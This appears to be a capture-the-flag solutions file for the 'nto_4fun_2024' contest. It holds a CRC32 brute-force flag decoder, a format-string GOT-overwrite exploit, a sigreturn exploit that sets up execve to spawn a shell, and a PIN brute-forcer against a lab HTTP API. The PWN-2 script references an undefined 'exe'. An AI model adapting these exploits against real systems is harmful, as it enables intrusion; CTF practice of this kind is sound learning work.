# nto_4fun_2024
## REV-1. 
flag_enc_2 = [0xf3, 0xe1, 0xcf, 0xed, 0x23, 0xcd, 0x6b, 0x64, 0x57, 0xad, 0xf9, 0x50, 0xe1, 0xb1, 0x99, 0xf2, 0xe4, 0xb6, 0xa9, 0xc6, 0x4c, 0x61, 0x80, 0x32, 0x02, 0x2b, 0x77, 0x93, 0x43, 0x3a, 0x2c, 0xab, 0x6a, 0x93, 0x0d, 0x2a, 0xd4, 0x14, 0xfa, 0x1b, 0x2f, 0x6f, 0x5d, 0x25, 0x6b, 0xf6, 0x47, 0xc4, 0xf5, 0x6c, 0xd9, 0x5a, 0x12, 0xad, 0x64, 0xe9]
a = [0]*256
for i in range(256):
    num=i
    for j in range(8):
        if (num&1)==0:
            num=num>>1
        else:
            num = num >> 1 ^ 0xedb88320
    a[i] = hex(num)
flag_enc=[0xedcfe1f3, 0x646bcd23, 0x50f9ad57, 0xf299b1e1, 0xc6a9b6e4, 0x3280614c, 0x93772b02, 0xab2c3a43, 0x2a0d936a, 0x1bfa14d4, 0x255d6f2f, 0xc447f66b, 0x5ad96cf5, 0xe964ad12]
for i in flag_enc:
    for k in range(0xff+1):
        for m in range(0xff+1):
            inp = [k,m]
            xor_point = 0xffffffff
            for j in range(2):
                xor_point=abs(int(a[(inp[j] ^ xor_point)&0xff], 16)) ^ (xor_point >> 8)
            if hex(0xffffffff - xor_point) == hex(i):
                print(chr(k)+chr(m),end="")

## PWN-1
from pwn import *

context.binary = exe = ELF("./main")
def start():
    if args.LOCAL:
        return process("./main")
    else:
        return remote(sys.argv[1],sys.argv[2])

io = start()
win = exe.symbols['win']
writes = {0x404018:win}
payload = fmtstr_payload(6,writes,0)
io.sendline(payload)
io.interactive()
```

## PWN-2
from pwn import *
def start():
    if args.LOCAL:
        return process("./task")
    else:
        return remote(sys.argv[1],sys.argv[2])

io = start()
offset = 8
BINSH = exe.address + 0x1430
payload = b'a'*8
payload += p64(0x41018)
payload += p64(0xf)
payload += p64(0x41015)

frame = SigreturnFrame()
frame.rax = 0x3b            
frame.rdi = BINSH           
frame.rsi = 0x0             
frame.rdx = 0x0             
frame.rip = 0x41015

payload += bytes(frame)
io.sendline(payload)
io.interactive()

## Crypto-1
import requests

headers = {'Content-type': 'application/json'}

skipped = []
r = requests.get("http://192.168.12.12:5000/api/EncryptedPin")
first = r.json()['encrypted_pin']
for i in range(1000,10000):
    r = requests.get("http://192.168.12.12:5000/api/Time")
    time = r.json()['current_time']
    r = requests.get("http://192.168.12.12:5000/api/EncryptedPin")
    enc_flag = r.json()['encrypted_pin']
    r = requests.post('http://192.168.12.12:5000/api/EncryptPin',json={"pin":i},headers=headers)
    cust_pin = r.json()['encrypted_pin']
    r = requests.get("http://192.168.12.12:5000/api/Time")
    time2 = r.json()['current_time']
    if time == time2:
        # print(time,enc_flag,cust_pin,time2)
        if str(enc_flag) == str(cust_pin):
            print(i)
            true_pin = i
            break
    else:
        skipped.append(i)
sk = []
for el in skipped:
    r = requests.get("http://192.168.12.12:5000/api/Time")
    time = r.json()['current_time']
    r = requests.get("http://192.168.12.12:5000/api/EncryptedPin")
    enc_flag = r.json()['encrypted_pin']
    r = requests.post('http://192.168.12.12:5000/api/EncryptPin',json={"pin":el},headers=headers)
    cust_pin = r.json()['encrypted_pin']
    r = requests.get("http://192.168.12.12:5000/api/Time")
    time2 = r.json()['current_time']
    if time == time2:
        # print(time,enc_flag,cust_pin,time2)
        if str(enc_flag) == str(cust_pin):
            print(el)
            break
    else:
        sk.append(el)


r = requests.post('http://192.168.12.12:5000/api/CheckPin',json={"pin":int(true_pin)},headers=headers)
print(r.text)
